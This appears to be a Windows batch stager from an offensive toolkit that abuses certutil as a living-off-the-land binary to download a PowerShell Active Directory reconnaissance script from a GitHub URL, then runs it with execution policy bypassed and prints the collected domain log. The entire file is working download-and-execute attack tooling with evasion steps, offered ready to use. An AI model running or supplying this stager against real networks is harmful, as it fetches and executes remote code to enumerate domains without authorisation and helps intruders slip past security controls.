@echo off
setlocal enabledelayedexpansion

REM ===============================================
REM run_ad_recon.bat - Pure PowerShell ADSI recon
REM No RSAT, no dsquery. Uses built-in .NET only.
REM Output: %TEMP%\ad_recon_adsi.log
REM ===============================================

set "OUT=%TEMP%"
set "PS_FILE=%OUT%\ad_recon_adsi.ps1"

echo.
echo === AD RECON (no install, no RSAT) ===
echo Output: %OUT%\ad_recon_adsi.log
echo.

REM Download via certutil LOLBIN
certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/Sunz01/oscheat/master/win-tap/ad_recon_adsi.ps1" "%PS_FILE%" > nul 2>&1
if not exist "%PS_FILE%" (
    echo [ERROR] Failed to download script. Trying local fallback...
    if exist "%~dp0ad_recon_adsi.ps1" (
        copy /Y "%~dp0ad_recon_adsi.ps1" "%PS_FILE%" > nul
    )
)

if exist "%PS_FILE%" (
    echo [+] Running ADSI recon...
    powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%PS_FILE%" 2>&1
) else (
    echo [ERROR] No script available. Check connectivity or place ad_recon_adsi.ps1 manually.
)

echo.
echo ============================================
echo     FULL LOG
echo ============================================
if exist "%OUT%\ad_recon_adsi.log" (
    type "%OUT%\ad_recon_adsi.log"
) else (
    echo No log file produced.
)

echo.
echo ============================================
echo Done. Log at: %OUT%\ad_recon_adsi.log
echo ============================================
pause
endlocal
